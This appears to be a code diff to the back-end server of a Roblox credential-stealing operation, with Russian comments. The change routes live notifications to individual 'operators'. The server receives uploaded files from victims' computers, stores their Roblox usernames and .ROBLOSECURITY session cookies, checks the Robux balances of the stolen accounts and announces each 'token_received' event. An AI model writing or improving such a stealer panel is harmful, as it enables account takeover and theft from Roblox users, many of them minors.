@@ -88,12 +88,33 @@ app.get('/events', requireAuth, (req, res) => {
   res.setHeader('Connection', 'keep-alive');
   res.flushHeaders();
 
-  sseClients.push(res);
+  const user = req.authUser || req.session.user;
+  const clientObj = { res, user };
+  sseClients.push(clientObj);
   
   req.on('close', () => {
-    sseClients = sseClients.filter(c => c !== res);
+    sseClients = sseClients.filter(c => c !== clientObj);
   });
 });
+
+function broadcastToOperator(operator, data) {
+  const opLower = (operator || '').toLowerCase().trim();
+  sseClients.forEach(client => {
+    if ((client.user || '').toLowerCase().trim() === opLower) {
+      try {
+        client.res.write(`data: ${JSON.stringify(data)}\n\n`);
+      } catch (e) {}
+    }
+  });
+}
+
+function broadcastToAll(data) {
+  sseClients.forEach(client => {
+    try {
+      client.res.write(`data: ${JSON.stringify(data)}\n\n`);
+    } catch (e) {}
+  });
+}
 
 // ── Утилиты декодирования и очистки имён ──────────────────────────────────────
 function decodeFilename(name) {
@@ -486,11 +507,7 @@ app.post('/upload', upload.array('files'), async (req, res) => {
     }
   }
 
-  sseClients.forEach(client => {
-    try {
-      client.write(`data: ${JSON.stringify({ event: 'new_file', files: uploaded })}\n\n`);
-    } catch (e) { }
-  });
+  broadcastToOperator(operator, { event: 'new_file', files: uploaded });
 
   res.json({ success: true, files: uploaded });
 });
@@ -559,11 +576,7 @@ app.post('/update-roblox', async (req, res) => {
 
     console.log(`[${new Date().toLocaleTimeString()}] 🔑 Обновлен Roblox аккаунт для "${computerName}": ${robloxUser}${robloSecurity ? ' (+токен)' : ''}`);
 
-    sseClients.forEach(client => {
-      try {
-        client.write(`data: ${JSON.stringify({ event: 'new_file' })}\n\n`);
-      } catch (e) {}
-    });
+    broadcastToOperator(operator, { event: 'new_file' });
     res.json({ success: true });
   } else {
     // Запись не найдена — создаём новую (upsert)
@@ -604,11 +617,7 @@ app.post('/update-roblox', async (req, res) => {
 
     console.log(`[${new Date().toLocaleTimeString()}] 🔑 Создан Roblox аккаунт для "${computerName}": ${robloxUser}${robloSecurity ? ' (+токен)' : ''}`);
 
-    sseClients.forEach(client => {
-      try {
-        client.write(`data: ${JSON.stringify({ event: 'new_file' })}\n\n`);
-      } catch (e) {}
-    });
+    broadcastToOperator(operator, { event: 'new_file' });
     res.json({ success: true });
   }
   } catch (e) {
@@ -833,19 +842,15 @@ async function fetchRobuxInfoAsync(robloSecurity, operator, uploaded, db) {
           }}
         );
       }
-      sseClients.forEach(client => {
-        try {
-          client.write(`data: ${JSON.stringify({
-            event: 'token_received',
-            operator: operator,
-            token: {
-              username: rbInfo.username || (uploaded[0] && uploaded[0].roblox?.user) || 'Roblox User',
-              userId: rbInfo.userId,
-              robux: rbInfo.robux || 0,
-              computer: (uploaded[0] && uploaded[0].computer?.name) || 'Unknown'
-            }
-          })}\n\n`);
-        } catch (e) {}
+      broadcastToOperator(operator, {
+        event: 'token_received',
+        operator: operator,
+        token: {
+          username: rbInfo.username || (uploaded[0] && uploaded[0].roblox?.user) || 'Roblox User',
+          userId: rbInfo.userId,
+          robux: rbInfo.robux || 0,
+          computer: (uploaded[0] && uploaded[0].computer?.name) || 'Unknown'
+        }
       });
     }
   } catch (e) {
@@ -1292,11 +1297,7 @@ app.get('/tokens', requireAuth, (req, res) => {
       }
 
       // Оповещаем клиентов в реальном времени через SSE
-      sseClients.forEach(client => {
-        try {
-          client.write(`data: ${JSON.stringify({ event: 'chat_message', message: newMsg })}\n\n`);
-        } catch (e) {}
-      });
+      broadcastToAll({ event: 'chat_message', message: newMsg });
 
       res.json({ success: true, message: newMsg });
     } catch (e) {
@@ -2864,7 +2865,7 @@ process.on('uncaughtException', (err) => {
 setInterval(() => {
   // Remove stale SSE clients (closed connections)
   sseClients = sseClients.filter(c => {
-    try { return c.writable && !c.destroyed; } catch { return false; }
+    try { return c.res && c.res.writable && !c.res.destroyed; } catch { return false; }
   });
   // Clean country cache (max 500 entries)
   if (countryCache.size > 500) {
